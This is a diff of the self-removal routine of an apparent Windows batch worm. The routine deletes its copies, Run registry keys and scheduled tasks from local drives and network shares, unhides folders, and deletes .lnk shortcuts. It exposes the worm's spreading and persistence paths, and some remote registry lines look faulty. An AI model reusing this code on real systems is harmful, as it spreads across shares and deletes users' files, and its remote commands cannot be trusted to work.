@@ -230,58 +230,44 @@ goto :cycle
 :remover
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
 
-if exist "%path_autoRun1%\%~nx0" (
-  attrib -h -r -s "%path_autoRun1%\%~nx0"
-  del /q "%path_autoRun1%\%~nx0"
-)
-if exist "%path_autoRun2%\%~nx0" (
-  attrib -h -r -s "%path_autoRun2%\%~nx0"
-  del /q "%path_autoRun2%\%~nx0"
-)
+if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
+if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"
 
 
 
 
 
 for %%i in (localAppData appData) do (
-  if exist "!%%i!\%~nx0" (
-    call attrib -h -r -s "!%%i!\%~nx0"
+  (
     call del /q "!%%i!\%~nx0"
-    (
-      call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-      call reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-      call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-      call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-      call schtasks /delete /tn "%app_name% %%i" /f
-    )>nul 2>nul
-  )
+    call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+    call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+    call reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+    call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+    call schtasks /delete /tn "%app_name% %%i" /f
+  )>nul 2>nul
 )
 
 
 
 
 
-for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
-  if exist "%%i:\" (
-    if exist "%%i:\%~nx0" (
-      attrib -h -r -s "%%i:\%~nx0"
-      del /q "%%i:\%~nx0"
+for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
+  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+    if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
       (
+        del /q "%%i:\%%j\%~nx0"
         reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-        reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+        reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         schtasks /delete /tn "%app_name% %%i" /f
       )>nul 2>nul
+    )
 
-      if /i "%%i:" NEQ "%systemDrive%" (
-        for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            attrib -h -s "%%i:\%%x"
-            if exist "%%i:\%%x.lnk" del /q "%%i:\%%x.lnk"
-          )
-        )
-      )
+    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+      attrib -h -s "%%i:\%%j"
+      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
     )
   )
 )
@@ -290,20 +276,23 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 
 
 
-for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
-    if exist "%%i\%%j\%~nx0" (
-      attrib -h -r -s "%%i\%%j\%~nx0"
-      del /q "%%i\%%j\%~nx0"
-      (for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%j" /f)>nul 2>nul
+for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
+    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
+      if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
+        (
+          del /q "%%h\%%i\%%j\%~nx0"
+          reg delete %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+          reg delete %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+          reg delete %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+          reg delete %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+          for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
+        )>nul 2>nul
+      )
 
-      if /i "%%j:" NEQ "C:" (
-        for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
-          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            attrib -h -s "%%i\%%j\%%x"
-            if exist "%%i\%%j\%%x.lnk" del /q "%%i\%%j\%%x.lnk"
-          )
-        )
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib -h -s "%%h\%%i\%%j"
+        if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
       )
     )
   )
